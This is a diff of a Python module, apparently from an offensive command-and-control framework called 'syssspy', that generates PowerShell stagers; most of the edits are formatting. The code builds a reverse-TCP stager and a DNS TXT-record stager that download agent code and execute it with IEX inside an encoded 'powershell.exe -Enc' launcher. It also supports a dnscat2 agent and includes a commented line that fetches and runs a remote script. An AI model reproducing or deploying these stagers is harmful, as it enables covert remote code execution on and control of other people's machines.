@@ -10,8 +10,8 @@ import base64
 
 
 DEBUG_MODULE = "PlatformPowershell"
-MIN_AGENT_LEN = 4000 # TODO: choose a value close to the real agent length
-MAX_AGENT_LEN = 10240 # TODO: choose shorter value, when done writing agent => faster staging
+MIN_AGENT_LEN = 4000  # TODO: choose a value close to the real agent length
+MAX_AGENT_LEN = 10240  # TODO: choose shorter value, when done writing agent => faster staging
 SIGNATURE_ALGO = "SHA512"
 SIGNATURE_LEN = 512
 SIGNATURE_LEN_B64 = encryption.lenofb64coding(SIGNATURE_LEN)
@@ -42,18 +42,22 @@ class PlatformPowershell(Platform, ModuleBase):
                 'Options'       :   ("TRUE", "FALSE")
             },
             'STAGEAUTHENTICATION' : {
-                'Description'   :   'Should the stager verify the agent code before executing (RSA signature verification with certificate pinning)',
+                'Description'   :   'Should the stager verify the agent code before executing (RSA signature ' +
+                                    'verification with certificate pinning)',
                 'Required'      :   True,
                 'Value'         :   "TRUE",
                 'Options'       :   ("TRUE", "FALSE")
             },
             'STAGECERTIFICATEFILE' : {
-                'Description'   :   'File path of a PEM with both RSA key and certificate to sign and verify staged agent with (you can generate a selfsigned cert by using the script gencert.sh initially)',
+                'Description'   :   'File path of a PEM with both RSA key and certificate to sign and verify ' +
+                                    'staged agent with (you can generate a selfsigned cert by using the script ' +
+                                    'gencert.sh initially)',
                 'Required'      :   False,
                 'Value'         :   "$TOOLPATH/data/syssspy.pem"
             },
             'AGENTTYPE': {
-                'Description'   :   'Defines which agent should be used (the default syssspy agent for this plattform, or some third party software we support)',
+                'Description'   :   'Defines which agent should be used (the default syssspy agent for this ' +
+                                    'plattform, or some third party software we support)',
                 'Required'      :   True,
                 'Value'         :   "DEFAULT",
                 'Options'       :   ("DEFAULT", "DNSCAT2")
@@ -73,8 +77,8 @@ class PlatformPowershell(Platform, ModuleBase):
         """
 
         if name.upper() == "STAGECERTIFICATEFILE":
-            if not(self._validate_certificatefile("STAGECERTIFICATEFILE",value)):
-                return True # value found, but not set
+            if not(self._validate_certificatefile("STAGECERTIFICATEFILE", value)):
+                return True  # value found, but not set
             else:
                 # reset all key/cert data, it might change now
                 self.privatekey = None
@@ -147,7 +151,7 @@ class PlatformPowershell(Platform, ModuleBase):
         """
 
         if self.privatekey and self.fingerprint and self.certificate and self.publickeyxml:
-            return # all set up
+            return  # all set up
 
         filename = sanatizefilename(self.options['STAGECERTIFICATEFILE']['Value'])
 
@@ -172,11 +176,15 @@ class PlatformPowershell(Platform, ModuleBase):
 
         # do we need STAGECERTIFICATEFILE and is it valid?
         if self.options['STAGED']['Value'] == "TRUE" and (self.options['STAGEENCODING']['Value'] == "TRUE"
-                or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE") or self.options['AGENTTYPE']['Value'] == "DNSCAT2":
-            if not self.options['STAGECERTIFICATEFILE']['Value'] or self.options['STAGECERTIFICATEFILE']['Value'] == "":
-                print_error("STAGECERTIFICATEFILE must be set when using STAGEENCODING and/or STAGEAUTHENTICATION and/or DNSCAT2")
+                    or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE") \
+                    or self.options['AGENTTYPE']['Value'] == "DNSCAT2":
+            if not self.options['STAGECERTIFICATEFILE']['Value'] \
+                    or self.options['STAGECERTIFICATEFILE']['Value'] == "":
+                print_error("STAGECERTIFICATEFILE must be set when using STAGEENCODING and/or " +
+                            "STAGEAUTHENTICATION and/or DNSCAT2")
                 valid = False
-            elif not self._validate_certificatefile("STAGECERTIFICATEFILE",self.options['STAGECERTIFICATEFILE']['Value']):
+            elif not self._validate_certificatefile("STAGECERTIFICATEFILE",
+                    self.options['STAGECERTIFICATEFILE']['Value']):
                 valid = False
 
         if self.options['AGENTTYPE']['Value'] == "DNSCAT" and self.handler.options['TRANSPORT']['VALUE'] != "DNS":
@@ -206,15 +214,17 @@ class PlatformPowershell(Platform, ModuleBase):
 
         # generate powershell + reversetcp stager
         if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
-            ip = self.handler.transport.options['CONNECTHOST']['Value'] or self.handler.transport.options['LHOST']['Value']
+            ip = self.handler.transport.options['CONNECTHOST']['Value'] \
+                 or self.handler.transport.options['LHOST']['Value']
             if ip == "0.0.0.0":
                 print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                 return None
-            port = self.handler.transport.options['CONNECTPORT']['Value'] or self.handler.transport.options['LPORT']['Value']
+            port = self.handler.transport.options['CONNECTPORT']['Value'] \
+                   or self.handler.transport.options['LPORT']['Value']
             print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))
 
             # TODO: Consider using helps.randomize_capitalization(...)
-            stager  = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip,port)
+            stager = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip, port)
             stager += '$a=New-Object char[]({});'.format(MAX_AGENT_LEN)
             stager += '$r=New-Object IO.StreamReader($c.GetStream());'
             stager += '$b=0;'
@@ -229,7 +239,7 @@ class PlatformPowershell(Platform, ModuleBase):
                 server = ""
 
             # TODO: Consider using helps.randomize_capitalization(...)
-            stager  = '$a="";for($i=0;;$i++){'
+            stager = '$a="";for($i=0;;$i++){'
             stager += '$c=([string](IEX "nslookup -type=TXT s$($i).{}. {}")).Split({})[1];'.format(zone, server, "'\"'")
             stager += 'if(!$c){break;}$a+=$c;}'
             stager += '$a=[Convert]::FromBase64String($a);'
@@ -255,12 +265,12 @@ class PlatformPowershell(Platform, ModuleBase):
             self._initkeycertificate()
 
             # split data in publickey, signature, agentcode:
-            parsepos=0 # next position to parse the array to string
+            parsepos = 0  # next position to parse the array to string
             stager += '$pk=New-Object String($a,{},{});'.format(parsepos, len(self.publickeyxml))
             parsepos += len(self.publickeyxml)
-            stager += '$sig=New-Object String($a,{},{});'.format(parsepos,SIGNATURE_LEN_B64)
+            stager += '$sig=New-Object String($a,{},{});'.format(parsepos, SIGNATURE_LEN_B64)
             parsepos += SIGNATURE_LEN_B64
-            stager += '$s=New-Object String($a,{},($b-{}));'.format(parsepos,parsepos)
+            stager += '$s=New-Object String($a,{},($b-{}));'.format(parsepos, parsepos)
 
             # verify the public key
             stager += '$sha=New-Object Security.Cryptography.SHA512Managed;'
@@ -280,15 +290,13 @@ class PlatformPowershell(Platform, ModuleBase):
         # finally execute the agent
         stager += '"GOAGENT";IEX $s;'
         print_debug(DEBUG_MODULE, "stager = {}".format(stager))
-        return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ") # TODO: baseCmd
+        return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ")  # TODO: baseCmd
 
     def getagent(self):
         """
         Generate the full powershell agent for this setup if possible
         :return: encoded agent bytes
         """
-
-        agent = ""
 
         if self.options['AGENTTYPE']['Value'] == "DNSCAT2":
             agent = self.getagent_dnscat2()
@@ -335,7 +343,8 @@ class PlatformPowershell(Platform, ModuleBase):
         if self.isstaged() and self.options['STAGEENCODING']['Value'] == "TRUE":
             self._initkeycertificate()
             if not self.fingerprint:
-                print_error("Cannot encode agent, since STAGEENCODING is active but creating the certificate fingerprint failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
+                print_error("Cannot encode agent, since STAGEENCODING is active but creating the certificate " +
+                            "fingerprint failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
                 return None
             else:
                 #print_debug(DEBUG_MODULE, "agent = {}".format(agent))
@@ -343,7 +352,8 @@ class PlatformPowershell(Platform, ModuleBase):
                 agent = encryption.xor_encode(agent, self.fingerprint)
 
         # check length for REVERSETCP staging
-        if len(agent) > MAX_AGENT_LEN and self.isstaged() and self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
+        if len(agent) > MAX_AGENT_LEN and self.isstaged() \
+                and self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
             print_error("agent is longer than stager buffer, staging will fail")
 
         return agent
@@ -359,7 +369,6 @@ class PlatformPowershell(Platform, ModuleBase):
             return None
 
         # we need the fingerprint as a pre-shared secret
-        secret = None
         if self.isstaged():  # if staged, fingerprint was already included in the stager
             secret = "$fp"
         else:
@@ -367,7 +376,8 @@ class PlatformPowershell(Platform, ModuleBase):
             secret = self.fingerprint
 
         if secret is None:
-            print_error("dnscat2 needs a pre-shared secret, and we failed using the certificate fingerprint for some reason")
+            print_error("dnscat2 needs a pre-shared secret, and we failed using the certificate " +
+                        "fingerprint for some reason")
             return None
 
         # load agent from file dnscat2-powershell
@@ -376,7 +386,8 @@ class PlatformPowershell(Platform, ModuleBase):
         f.close()
 
         # or if you do not want to wait for ever for testing, TODO: remove!!!
-        #agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"
+        #agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/' +
+        # 'lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"
 
         zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
         server = self.handler.transport.options['DNSSERVER']['Value']
@@ -443,11 +454,13 @@ class PlatformPowershell(Platform, ModuleBase):
 
         # get and replace some values
         if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
-            ip = self.handler.transport.options['CONNECTHOST']['Value'] or self.handler.transport.options['LHOST']['Value']
+            ip = self.handler.transport.options['CONNECTHOST']['Value'] \
+                 or self.handler.transport.options['LHOST']['Value']
             if ip == "0.0.0.0":
                 print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                 return None
-            port = self.handler.transport.options['CONNECTPORT']['Value'] or self.handler.transport.options['LPORT']['Value']
+            port = self.handler.transport.options['CONNECTPORT']['Value'] \
+                   or self.handler.transport.options['LPORT']['Value']
             print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))
 
             agent = agent.replace('SYREPLACE_CONNECTIONMETHOD', "REVERSETCP")
